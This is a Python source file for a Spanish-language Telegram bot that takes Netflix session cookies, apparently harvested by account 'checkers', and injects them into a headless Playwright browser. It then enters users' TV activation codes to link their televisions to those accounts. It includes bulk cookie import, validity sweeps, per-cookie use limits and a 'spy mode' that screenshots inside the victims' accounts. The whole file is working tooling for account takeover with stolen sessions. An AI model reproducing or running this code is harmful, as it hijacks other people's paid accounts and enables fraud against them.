import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import json
import os
import time
import threading
from datetime import datetime
from flask import Flask
from playwright.sync_api import sync_playwright

# Configuración inicial
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', 'TU_TOKEN_AQUI')
bot = telebot.TeleBot(TELEGRAM_TOKEN)
app = Flask(__name__)

# ID del Súper Administrador (El dios del bot)
SUPER_ADMIN_ID = 8398522835 
MAX_USES_PER_COOKIE = 3
RATE_LIMIT_SECONDS = 60 # 1 minuto entre intentos de usuario

# Variables globales para control en memoria
user_last_action = {}
db_lock = threading.Lock()

def init_db():
    """Inicializa y lee la base de datos de forma segura."""
    with db_lock:
        if not os.path.exists('database.json'):
            return {
                'cookies_list': [], 
                'admins': [SUPER_ADMIN_ID], 
                'maintenance_mode': False,
                'banned_users': [],
                'user_profiles': {},
                'stats': {'total_activations': 0, 'failed_attempts': 0}
            }
        try:
            with open('database.json', 'r') as f:
                db = json.load(f)
                # Migración automática a la nueva estructura si es antigua
                if 'banned_users' not in db: db['banned_users'] = []
                if 'user_profiles' not in db: db['user_profiles'] = {}
                if 'stats' not in db: db['stats'] = {'total_activations': 0, 'failed_attempts': 0}
                if 'admins' not in db: db['admins'] = [SUPER_ADMIN_ID]
                if SUPER_ADMIN_ID not in db['admins']: db['admins'].append(SUPER_ADMIN_ID)
                return db
        except:
            return {
                'cookies_list': [], 'admins': [SUPER_ADMIN_ID], 'maintenance_mode': False,
                'banned_users': [], 'user_profiles': {},
                'stats': {'total_activations': 0, 'failed_attempts': 0}
            }

def save_db(db_data):
    """Guarda la base de datos de forma segura."""
    with db_lock:
        with open('database.json', 'w') as f:
            json.dump(db_data, f, indent=4)

def is_admin(user_id):
    """Comprueba si el usuario tiene permisos de administrador."""
    if user_id == SUPER_ADMIN_ID:
        return True
    db = init_db()
    return user_id in db.get('admins', [])

def track_user(message):
    """Guarda el perfil del usuario cada vez que interactúa."""
    db = init_db()
    user_id = str(message.from_user.id)
    if user_id not in db['user_profiles']:
        db['user_profiles'][user_id] = {
            'first_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'username': message.from_user.username,
            'first_name': message.from_user.first_name,
            'activations': 0
        }
        save_db(db)

def check_rate_limit(user_id):
    """Comprueba si el usuario está spameando el bot."""
    if is_admin(user_id): return True # Admins no tienen límite
    now = time.time()
    if user_id in user_last_action:
        if now - user_last_action[user_id] < RATE_LIMIT_SECONDS:
            return False
    user_last_action[user_id] = now
    return True

def clean_old_screenshots():
    """Limpia la basura residual (fotos antiguas)."""
    for file in os.listdir():
        if file.endswith('.png') and file.startswith(('error_', 'spy_')):
            try: os.remove(file)
            except: pass

def parse_netscape_cookies(text):
    """Traductor Mágico: Convierte el formato texto de los Checkers a JSON de Playwright."""
    cookies = []
    for line in text.split('\n'):
        line = line.strip()
        # Ignorar líneas vacías o cabeceras del checker (KANT FLIX, Email, etc.)
        if not line or not line.startswith('.'): 
            continue
        
        # Separar por espacios o tabulaciones
        parts = line.split()
        if len(parts) >= 7:
            domain = parts[0]
            path = parts[2]
            secure = parts[3].upper() == 'TRUE'
            name = parts[5]
            value = parts[6]
            
            cookies.append({
                "name": name,
                "value": value,
                "domain": domain,
                "path": path,
                "secure": secure
            })
    return cookies

def run_playwright_activation(code, cookie_data):
    """Motor principal: Inicia navegador, inyecta cookie y activa la TV."""
    screenshot_path = f"error_{int(time.time())}.png"
    browser = None
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'])
            context = browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            
            if isinstance(cookie_data, str): cookies = json.loads(cookie_data)
            else: cookies = cookie_data
            
            context.add_cookies(cookies)
            page = context.new_page()
            
            try:
                page.goto('https://www.netflix.com/tv8', timeout=60000)
                time.sleep(3)
                
                # Chequeo de caducidad inmediato
                if "login" in page.url.lower():
                    page.screenshot(path=screenshot_path)
                    return False, "❌ La cookie ha caducado o es inválida. Pide al admin que la cambie.", screenshot_path
                
                # --- NUEVA LÓGICA ANTI 8 CASILLAS ---
                # Hacemos clic en el primer input visible (la primera de las 8 casillas)
                page.locator('input').first.click(timeout=15000)
                
                # Usamos el teclado virtual de Playwright para teclear como humanos.
                # Al escribir con delay, Netflix pasará solo a la siguiente casilla.
                page.keyboard.type(code, delay=100)
                
                # Esperamos un poco a que el botón gris se vuelva clicable
                time.sleep(2)
                
                # Buscamos y hacemos clic en el botón de continuar
                button_locator = page.locator('button[type="button"], button[type="submit"], button[data-uia="action-submit"]').first
                button_locator.click(timeout=10000)
                # -------------------------------------
                
                time.sleep(5)
                
                if page.locator('.ui-message-error, [data-uia="error-message-container"]').is_visible():
                    page.screenshot(path=screenshot_path)
                    error_text = page.locator('.ui-message-error, [data-uia="error-message-container"]').first.text_content()
                    return False, f"❌ Netflix rechazó el código: {error_text}", screenshot_path
                
                return True, "🎉 ¡**TV Activada con éxito**! 📺✨\n\nTu televisor ha sido enlazado correctamente con nuestra cuenta. ¡Prepara las palomitas y disfruta!", None
                
            except Exception as e:
                page.screenshot(path=screenshot_path)
                return False, f"❌ Error interactuando con la web. Detalles: {str(e)[:100]}", screenshot_path
            finally:
                if browser: browser.close()
                
    except Exception as e:
        return False, f"❌ Error de servidor (Playwright crash). {str(e)[:100]}", None

def check_cookie_validity(cookie_data):
    """Chequeo REAL simulando entrada a la web principal."""
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-setuid-sandbox'])
            context = browser.new_context()
            if isinstance(cookie_data, str): cookies = json.loads(cookie_data)
            else: cookies = cookie_data
            context.add_cookies(cookies)
            page = context.new_page()
            
            page.goto('https://www.netflix.com/browse', timeout=30000)
            time.sleep(4)
            is_valid = "login" not in page.url.lower() and "logout" not in page.url.lower()
            browser.close()
            return is_valid
    except:
        return False

def background_spy(chat_id, msg_id, cookie_data):
    """Entra en la cuenta sigilosamente y hace una foto de lo que hay dentro."""
    screenshot_path = f"spy_{int(time.time())}.png"
    browser = None
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-setuid-sandbox'])
            context = browser.new_context(viewport={'width': 1280, 'height': 720})
            if isinstance(cookie_data, str): cookies = json.loads(cookie_data)
            else: cookies = cookie_data
            context.add_cookies(cookies)
            page = context.new_page()
            page.goto('https://www.netflix.com/browse', timeout=40000)
            time.sleep(6) 
            page.screenshot(path=screenshot_path)
            
            with open(screenshot_path, 'rb') as photo:
                bot.send_photo(chat_id, photo, caption="📸 **Captura en Vivo (Modo Espía)**\n\nAquí tienes lo que se ve dentro de la cuenta ahora mismo. Vigila perfiles llenos o bloqueos de hogar.", parse_mode="Markdown")
            bot.delete_message(chat_id, msg_id)
    except Exception as e:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"❌ Error en Modo Espía: No se pudo cargar la web. Detalles: {str(e)[:100]}")
    finally:
        if browser:
            try: browser.close()
            except: pass
        if os.path.exists(screenshot_path):
            try: os.remove(screenshot_path)
            except: pass

def background_check_cookies(chat_id):
    """Evalúa toda la DB y manda un ticket de diagnóstico."""
    db = init_db()
    buenas = 0
    malas = 0
    report = "📋 **REPORTE DE DIAGNÓSTICO** 📋\n\n"
    for i, c in enumerate(db['cookies_list']):
        if c['status'] == 'active':
            is_valid = check_cookie_validity(c['data'])
            if not is_valid:
                db['cookies_list'][i]['status'] = 'exhausted'
                malas += 1
                report += f"❌ Cuenta #{i+1} ({c.get('country','N/A')}) ➔ `Caducada`\n"
            else:
                buenas += 1
                report += f"✅ Cuenta #{i+1} ({c.get('country','N/A')}) ➔ `Operativa`\n"
    save_db(db)
    report += f"\n📊 **Resumen Global:** {buenas} Vivas | {malas} Eliminadas."
    bot.send_message(chat_id, report, parse_mode="Markdown")

def main_user_keyboard(user_id):
    """Teclado inferior persistente."""
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(KeyboardButton("📺 Activar TV"), KeyboardButton("ℹ️ Ayuda"))
    if is_admin(user_id):
        markup.add(KeyboardButton("👑 Panel Admin"))
    return markup

def countries_keyboard():
    """Teclado Inline para seleccionar países a la hora de activar."""
    db = init_db()
    active_countries = set()
    for c in db['cookies_list']:
        if c['status'] == 'active':
            active_countries.add(c.get('country', 'N/A'))
    
    markup = InlineKeyboardMarkup(row_width=2)
    for country in active_countries:
        markup.add(InlineKeyboardButton(f"🌍 {country}", callback_data=f"tv_country_{country}"))
    markup.add(InlineKeyboardButton("🎲 Aleatorio (El más rápido)", callback_data="tv_country_random"))
    return markup

def admin_panel_keyboard(db):
    """El todopoderoso panel de administrador Inline."""
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("➕ Añadir 1 Cookie", callback_data="admin_add_cookie"),
        InlineKeyboardButton("📥 Importar Lote", callback_data="admin_bulk_import")
    )
    markup.add(
        InlineKeyboardButton("📊 Estado Cuentas", callback_data="admin_status"),
        InlineKeyboardButton("📸 Modo Espía", callback_data="admin_spy_menu")
    )
    markup.add(
        InlineKeyboardButton("🔍 Diagnóstico Pro", callback_data="admin_check"),
        InlineKeyboardButton("👥 Gestionar Admins", callback_data="admin_manage_admins")
    )
    markup.add(
        InlineKeyboardButton("📢 Mensaje General", callback_data="admin_broadcast"),
        InlineKeyboardButton("🧹 Limpiar Agotadas", callback_data="admin_clean")
    )
    markup.add(
        InlineKeyboardButton("💾 Backup de Datos", callback_data="admin_backup"),
        InlineKeyboardButton("🛡️ Panel de Baneos", callback_data="admin_bans")
    )
    markup.add(
        InlineKeyboardButton("📄 Exportar Usuarios", callback_data="admin_export_users"),
        InlineKeyboardButton("⚙️ Forzar Limpieza", callback_data="admin_clear_cache")
    )
    markup.add(
        InlineKeyboardButton("📈 Estadísticas", callback_data="admin_stats")
    )
    
    maint_text = "🔴 Quitar Mantenimiento" if db.get('maintenance_mode', False) else "🟢 Activar Mantenimiento"
    markup.add(InlineKeyboardButton(maint_text, callback_data="admin_toggle_maint"))
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    track_user(message)
    user_id = message.from_user.id
    db = init_db()
    
    if user_id in db.get('banned_users', []): return
    
    if db.get('maintenance_mode', False) and not is_admin(user_id):
        bot.send_message(message.chat.id, "🛠️ *MODO MANTENIMIENTO*\n\nEstamos realizando mejoras en el sistema y reponiendo cuentas. Vuelve un poco más tarde, ¡gracias por la paciencia! 🍿", parse_mode="Markdown")
        return

    texto = (
        "🎬 *¡Bienvenido al Centro de Activación Netflix TV!* 🎬\n\n"
        "Soy tu asistente virtual de confianza. Conmigo podrás vincular tu televisor en segundos sin lidiar con correos ni contraseñas.\n\n"
        "✨ *¿Qué debes hacer?*\n"
        "Presiona el botón de abajo **📺 Activar TV**, elige tu región, y envíame el código de 8 dígitos que aparece en tu pantalla.\n\n"
        "🚀 *Rápido, seguro y 100% automático.*"
    )
    bot.send_message(message.chat.id, texto, reply_markup=main_user_keyboard(user_id), parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "ℹ️ Ayuda")
def help_menu(message):
    track_user(message)
    texto = """
*¿Cómo activar tu TV paso a paso?* 📺

1️⃣ Abre la app de *Netflix* en tu Televisión.
2️⃣ Selecciona la opción *"Iniciar sesión por la Web"*.
3️⃣ Aparecerá un *código de 8 dígitos* en la pantalla.
4️⃣ Vuelve aquí y pulsa el botón '📺 Activar TV'.
5️⃣ Selecciona el país y envíame ese código exacto.
6️⃣ ¡Espera unos segundos mientras nuestro bot hace la magia! ✨

⚠️ *Nota:* Asegúrate de enviar los 8 dígitos correctamente, sin espacios adicionales.
    """
    bot.reply_to(message, texto, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "📺 Activar TV")
def activate_tv_start(message):
    track_user(message)
    user_id = message.from_user.id
    db = init_db()
    
    if user_id in db.get('banned_users', []): return
    if db.get('maintenance_mode', False) and not is_admin(user_id):
        bot.reply_to(message, "🛠️ Sistema en mantenimiento. Vuelve más tarde.")
        return
        
    if not check_rate_limit(user_id):
        bot.reply_to(message, f"⏳ Por favor, espera {RATE_LIMIT_SECONDS} segundos entre cada intento para no saturar el servidor.")
        return

    active_cookies = [c for c in db['cookies_list'] if c['status'] == 'active']
    if not active_cookies:
        bot.reply_to(message, "❌ *Lo sentimos*, no hay cuentas de Netflix disponibles en este momento. El administrador repondrá pronto.", parse_mode="Markdown")
        return

    bot.send_message(message.chat.id, "🌍 *Elige la región de la cuenta que deseas usar:*", reply_markup=countries_keyboard(), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("tv_country_"))
def ask_for_tv_code(call):
    country = call.data.replace("tv_country_", "")
    msg = bot.send_message(call.message.chat.id, f"Has elegido **{country.capitalize()}**.\n\n📺 Ahora, envíame el **código de 8 dígitos** que aparece en la pantalla de tu televisión:", parse_mode="Markdown")
    bot.register_next_step_handler(msg, lambda m: process_tv_code(m, country))

def process_tv_code(message, country):
    tv_code = message.text.strip().replace(" ", "")
    user_id = message.from_user.id
    
    if len(tv_code) != 8:
        bot.reply_to(message, "❌ El código debe tener exactamente 8 caracteres (sin contar espacios). Inténtalo de nuevo.")
        return

    bot.send_message(message.chat.id, "🔄 *Conectando con los servidores de Netflix y activando tu TV...*\n\n_(Esto puede tardar entre 15 y 30 segundos, por favor no envíes más mensajes)_", parse_mode="Markdown")
    
    db = init_db()
    available_cookie = None
    cookie_index = -1
    
    for i, cookie in enumerate(db['cookies_list']):
        if cookie['status'] == 'active' and (country == 'random' or cookie.get('country', 'N/A') == country):
            available_cookie = cookie
            cookie_index = i
            break
            
    if not available_cookie:
        bot.reply_to(message, "❌ Lo siento, alguien acaba de usar la última cuenta de esa región. Prueba otra o avisa al Administrador.")
        return
        
    success, result_msg, screenshot_path = run_playwright_activation(tv_code, available_cookie['data'])
    db = init_db() 
    
    if success:
        db['cookies_list'][cookie_index]['uses'] += 1
        if db['cookies_list'][cookie_index]['uses'] >= MAX_USES_PER_COOKIE:
            db['cookies_list'][cookie_index]['status'] = 'exhausted'
        db['stats']['total_activations'] += 1
        
        user_str = str(user_id)
        if user_str in db['user_profiles']:
            db['user_profiles'][user_str]['activations'] += 1
            
        save_db(db)
        bot.reply_to(message, result_msg)
        
        for admin in db.get('admins', []):
            try: bot.send_message(admin, f"✅ Usuario @{message.from_user.username} (ID: {user_id}) ha activado el código: `{tv_code}` en la región {country}.\nUsos: {db['cookies_list'][cookie_index]['uses']}/{MAX_USES_PER_COOKIE}")
            except: pass
    else:
        db['stats']['failed_attempts'] += 1
        if "caducado" in result_msg.lower():
            db['cookies_list'][cookie_index]['status'] = 'exhausted'
            
        save_db(db)
        bot.reply_to(message, "❌ Hubo un problema al activar tu TV. Los administradores han sido notificados para revisarlo.")
        
        admin_error = f"⚠️ Fallo al activar `{tv_code}` de @{message.from_user.username}.\nMotivo: {result_msg}"
        for admin in db.get('admins', []):
            try:
                if screenshot_path and os.path.exists(screenshot_path):
                    with open(screenshot_path, 'rb') as photo:
                        bot.send_photo(admin, photo, caption=admin_error)
                else:
                    bot.send_message(admin, admin_error)
            except: pass
            
        if screenshot_path and os.path.exists(screenshot_path):
            os.remove(screenshot_path)

@bot.message_handler(func=lambda m: m.text == "👑 Panel Admin")
@bot.message_handler(commands=['admin'])
def admin_panel_start(message):
    if not is_admin(message.from_user.id): return
    db = init_db()
    bot.send_message(message.chat.id, "👑 **PANEL DE CONTROL MAESTRO** 👑\n\nElige una acción:", reply_markup=admin_panel_keyboard(db), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callbacks(call):
    if not is_admin(call.from_user.id): return
    db = init_db()
    
    if call.data == "admin_status":
        texto = "📊 **Estado de las Cookies:**\n\n"
        activas, agotadas = 0, 0
        for i, c in enumerate(db['cookies_list']):
            estado = "🟢 Activa" if c['status'] == 'active' else "🔴 Agotada"
            texto += f"Cookie {i+1} ({c.get('country','N/A')}): {estado} - Usos: {c['uses']}/{MAX_USES_PER_COOKIE}\n"
            if c['status'] == 'active': activas += 1
            else: agotadas += 1
        texto += f"\nTotal: {activas} Activas | {agotadas} Agotadas."
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=texto, reply_markup=admin_panel_keyboard(db), parse_mode="Markdown")
        
    elif call.data == "admin_stats":
        stats = db.get('stats', {'total_activations': 0, 'failed_attempts': 0})
        texto = "📈 **ESTADÍSTICAS DEL SISTEMA** 📈\n\n"
        texto += f"✅ Activaciones exitosas: `{stats['total_activations']}`\n"
        texto += f"❌ Intentos fallidos: `{stats['failed_attempts']}`\n"
        texto += f"👥 Usuarios registrados: `{len(db.get('user_profiles', {}))}`\n"
        texto += f"🚫 Cuentas baneadas: `{len(db.get('banned_users', []))}`\n"
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=texto, reply_markup=admin_panel_keyboard(db), parse_mode="Markdown")
        
    elif call.data == "admin_spy_menu":
        markup = InlineKeyboardMarkup(row_width=1)
        active_cookies = [c for c in db['cookies_list'] if c['status'] == 'active']
        if not active_cookies:
            bot.answer_callback_query(call.id, "No hay cuentas activas para espiar.", show_alert=True)
            return
        for i, c in enumerate(db['cookies_list']):
            if c['status'] == 'active':
                markup.add(InlineKeyboardButton(f"📸 Ver Cuenta #{i+1} ({c.get('country','N/A')})", callback_data=f"spy_{i}"))
        markup.add(InlineKeyboardButton("🔙 Volver", callback_data="admin_status"))
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="📸 **MODO ESPÍA (Live Screen)**\n\nSelecciona una cuenta activa de la lista. El bot entrará de forma invisible y te enviará una captura en vivo para revisar perfiles o bloqueos.", reply_markup=markup, parse_mode="Markdown")

    elif call.data == "admin_add_cookie":
        msg = bot.send_message(call.message.chat.id, "🌍 ¿A qué **PAÍS** pertenece esta cuenta? (Ej: España, Colombia):")
        bot.register_next_step_handler(msg, process_add_cookie_country)

    elif call.data == "admin_bulk_import":
        msg = bot.send_message(call.message.chat.id, "📥 **Importación Lote**\n\n¿De qué **PAÍS** son las cuentas de este lote? (Ej: España):", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_bulk_country)

    elif call.data == "admin_check":
        bot.answer_callback_query(call.id, "🔍 Iniciando diagnóstico profundo... Esto puede tardar varios minutos.")
        bot.send_message(call.message.chat.id, "🔍 *Diagnóstico en marcha...* Analizando cada cuenta activa en tiempo real.", parse_mode="Markdown")
        threading.Thread(target=background_check_cookies, args=(call.message.chat.id,)).start()

    elif call.data == "admin_manage_admins":
        if call.from_user.id != SUPER_ADMIN_ID:
            bot.answer_callback_query(call.id, "❌ Solo el creador puede gestionar administradores.", show_alert=True)
            return
        markup = InlineKeyboardMarkup()
        for admin_id in db['admins']:
            markup.add(InlineKeyboardButton(f"Admin: {admin_id}", callback_data="noop"), InlineKeyboardButton("❌ Quitar", callback_data=f"del_admin_{admin_id}"))
        markup.add(InlineKeyboardButton("➕ Añadir Nuevo Admin", callback_data="add_new_admin"))
        markup.add(InlineKeyboardButton("🔙 Volver", callback_data="admin_status"))
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="👥 **Gestión de Administradores**", reply_markup=markup, parse_mode="Markdown")
        
    elif call.data == "admin_broadcast":
        msg = bot.send_message(call.message.chat.id, "📢 Escribe el mensaje que quieres enviar a **TODOS** los usuarios registrados:")
        bot.register_next_step_handler(msg, process_broadcast)
        
    elif call.data == "admin_clean":
        db['cookies_list'] = [c for c in db['cookies_list'] if c['status'] == 'active']
        save_db(db)
        bot.answer_callback_query(call.id, "✅ Base de datos limpiada de cuentas agotadas.", show_alert=True)
        
    elif call.data == "admin_backup":
        if os.path.exists('database.json'):
            with open('database.json', 'rb') as doc:
                bot.send_document(call.message.chat.id, doc, caption="💾 Aquí tienes el backup de tu base de datos y usuarios.")
        else:
            bot.answer_callback_query(call.id, "No se encontró el archivo de base de datos.")

    elif call.data == "admin_bans":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔨 Banear Usuario", callback_data="ban_user"))
        markup.add(InlineKeyboardButton("🕊️ Desbanear Usuario", callback_data="unban_user"))
        markup.add(InlineKeyboardButton("🔙 Volver", callback_data="admin_status"))
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"🛡️ **Panel de Baneos**\n\nUsuarios actualmente baneados: `{len(db.get('banned_users', []))}`", reply_markup=markup, parse_mode="Markdown")

    elif call.data == "admin_export_users":
        if not db.get('user_profiles'):
            bot.answer_callback_query(call.id, "No hay perfiles registrados aún.", show_alert=True)
            return
        
        with open("usuarios.txt", "w", encoding="utf-8") as f:
            f.write("LISTA DE USUARIOS DEL BOT\n" + "="*30 + "\n\n")
            for uid, data in db['user_profiles'].items():
                f.write(f"ID: {uid}\nNombre: {data.get('first_name', 'N/A')}\nAlias: @{data.get('username', 'N/A')}\nActivaciones: {data.get('activations', 0)}\nFecha Registro: {data.get('first_seen', 'N/A')}\n\n")
        
        with open("usuarios.txt", "rb") as doc:
            bot.send_document(call.message.chat.id, doc, caption="📄 Lista completa de tus usuarios exportada.")
        os.remove("usuarios.txt")
        
    elif call.data == "admin_clear_cache":
        clean_old_screenshots()
        user_last_action.clear()
        bot.answer_callback_query(call.id, "⚙️ Caché borrada, RAM liberada y límites de anti-spam reseteados.", show_alert=True)
        
    elif call.data == "admin_toggle_maint":
        db['maintenance_mode'] = not db.get('maintenance_mode', False)
        save_db(db)
        estado = "ACTIVADO 🔴" if db['maintenance_mode'] else "DESACTIVADO 🟢"
        bot.answer_callback_query(call.id, f"Mantenimiento {estado}", show_alert=True)
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=admin_panel_keyboard(db))

@bot.callback_query_handler(func=lambda call: call.data.startswith("spy_"))
def execute_spy_mode(call):
    if not is_admin(call.from_user.id): return
    db = init_db()
    try:
        index = int(call.data.replace("spy_", ""))
        cookie_data = db['cookies_list'][index]['data']
        country = db['cookies_list'][index].get('country', 'N/A')
    except:
        bot.answer_callback_query(call.id, "Error leyendo los datos de la cuenta.", show_alert=True)
        return
        
    bot.answer_callback_query(call.id, "📸 Generando captura en vivo... (15s)")
    wait_msg = bot.send_message(call.message.chat.id, f"🕵️‍♂️ *Modo Espía:* Entrando a la cuenta #{index+1} ({country})...", parse_mode="Markdown")
    threading.Thread(target=background_spy, args=(call.message.chat.id, wait_msg.message_id, cookie_data)).start()

@bot.callback_query_handler(func=lambda call: call.data.startswith("del_admin_") or call.data == "add_new_admin" or call.data in ["ban_user", "unban_user"])
def manage_security_actions(call):
    db = init_db()
    if call.data.startswith("del_admin_"):
        if call.from_user.id != SUPER_ADMIN_ID: return
        target = int(call.data.replace("del_admin_", ""))
        if target in db['admins']:
            db['admins'].remove(target)
            save_db(db)
            bot.answer_callback_query(call.id, "Admin eliminado.")
            
    elif call.data == "add_new_admin":
        if call.from_user.id != SUPER_ADMIN_ID: return
        msg = bot.send_message(call.message.chat.id, "Envía la ID numérica del nuevo admin:")
        bot.register_next_step_handler(msg, process_add_new_admin)
        
    elif call.data == "ban_user":
        msg = bot.send_message(call.message.chat.id, "Envía la ID del usuario que quieres banear:")
        bot.register_next_step_handler(msg, process_ban_user)
        
    elif call.data == "unban_user":
        msg = bot.send_message(call.message.chat.id, "Envía la ID del usuario que quieres desbanear:")
        bot.register_next_step_handler(msg, process_unban_user)

def process_add_cookie_country(message):
    country = message.text.strip().capitalize()
    msg = bot.send_message(message.chat.id, f"País: **{country}**\n\n🍪 Pega ahora el texto de la cuenta (JSON o formato del Checker):", parse_mode="Markdown")
    bot.register_next_step_handler(msg, lambda m: process_add_cookie_data(m, country))

def process_add_cookie_data(message, country):
    cookie_data_str = message.text.strip()
    try:
        # Intentar leer como JSON primero
        parsed_cookies = json.loads(cookie_data_str)
    except json.JSONDecodeError:
        # Si falla, el bot usará el nuevo Traductor Mágico para Netscape
        parsed_cookies = parse_netscape_cookies(cookie_data_str)
        
    if not parsed_cookies:
        bot.reply_to(message, "❌ *Error de formato:*\nNo he podido reconocer ninguna cookie. Asegúrate de que es JSON o formato Netscape válido.")
        return

    db = init_db()
    db['cookies_list'].append({
        'country': country,
        'data': json.dumps(parsed_cookies) if isinstance(parsed_cookies, list) else parsed_cookies,
        'uses': 0,
        'status': 'active'
    })
    save_db(db)
    bot.reply_to(message, f"✅ *Cookie guardada con éxito*\nSe ha detectado el formato y asignado a **{country}**. Límite: {MAX_USES_PER_COOKIE} usos.", parse_mode="Markdown")

def process_bulk_country(message):
    country = message.text.strip().capitalize()
    msg = bot.send_message(message.chat.id, f"Lote para **{country}**.\n\nEnvía ahora el archivo `.txt` o pega el JSON con el Array de múltiples cookies:", parse_mode="Markdown")
    bot.register_next_step_handler(msg, lambda m: process_bulk_data(m, country))

def process_bulk_data(message, country):
    db = init_db()
    added = 0
    try:
        if message.document:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            content = downloaded_file.decode('utf-8')
        else:
            content = message.text.strip()
            
        data_list = json.loads(content)
        if not isinstance(data_list, list):
            raise ValueError("El JSON debe ser un Array.")
            
        for cookie_array in data_list:
            if isinstance(cookie_array, list):
                db['cookies_list'].append({
                    'country': country,
                    'data': json.dumps(cookie_array) if not isinstance(cookie_array, str) else cookie_array,
                    'uses': 0,
                    'status': 'active'
                })
                added += 1
        save_db(db)
        bot.reply_to(message, f"🎉 **¡Lote Importado!** 🎉\n\nAñadidas `{added}` cuentas para **{country}**.", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Error importando. Asegúrate de enviar una lista de listas JSON.\nDetalle: {str(e)[:100]}")

def process_add_new_admin(message):
    try:
        new_admin = int(message.text.strip())
        db = init_db()
        if new_admin not in db['admins']:
            db['admins'].append(new_admin)
            save_db(db)
            bot.reply_to(message, f"✅ Admin {new_admin} añadido.")
        else:
            bot.reply_to(message, "⚠️ Ese ID ya es admin.")
    except:
        bot.reply_to(message, "❌ ID inválida. Debe ser un número.")

def process_ban_user(message):
    try:
        target_id = int(message.text.strip())
        db = init_db()
        if target_id not in db['banned_users']:
            db['banned_users'].append(target_id)
            save_db(db)
            bot.reply_to(message, f"🔨 Usuario {target_id} baneado de por vida.")
    except:
        bot.reply_to(message, "❌ ID inválida.")

def process_unban_user(message):
    try:
        target_id = int(message.text.strip())
        db = init_db()
        if target_id in db['banned_users']:
            db['banned_users'].remove(target_id)
            save_db(db)
            bot.reply_to(message, f"🕊️ Usuario {target_id} desbaneado.")
    except:
        bot.reply_to(message, "❌ ID inválida.")

def process_broadcast(message):
    texto = message.text
    db = init_db()
    usuarios = list(db.get('user_profiles', {}).keys())
    enviados = 0
    bot.reply_to(message, f"📢 Iniciando envío masivo a {len(usuarios)} usuarios...")
    
    for uid_str in usuarios:
        try:
            bot.send_message(int(uid_str), f"🔔 **MENSAJE DEL ADMINISTRADOR** 🔔\n\n{texto}", parse_mode="Markdown")
            enviados += 1
            time.sleep(0.1) 
        except:
            pass 
            
    bot.send_message(message.chat.id, f"✅ Mensaje general enviado a {enviados} usuarios.")


@app.route('/')
def home():
    """Ruta principal para UptimeRobot. Así el servidor nunca duerme."""
    return "🚀 El Bot de Activación de Netflix TV está vivo y operativo."

def run_web_server():
    """Arranca Flask en un hilo separado con el puerto de Render."""
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

if __name__ == "__main__":
    print("⏳ Iniciando la base de datos...")
    init_db()
    
    print("🌐 Iniciando servidor web (Keep-Alive) en segundo plano...")
    server_thread = threading.Thread(target=run_web_server)
    server_thread.daemon = True
    server_thread.start()
    
    print("🤖 Iniciando Bot de Telegram. ¡Escuchando comandos!")
    try:
        # Modo infinito, auto-restart si se cae la conexión de red
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except Exception as e:
        print(f"Error fatal en el bot: {e}")
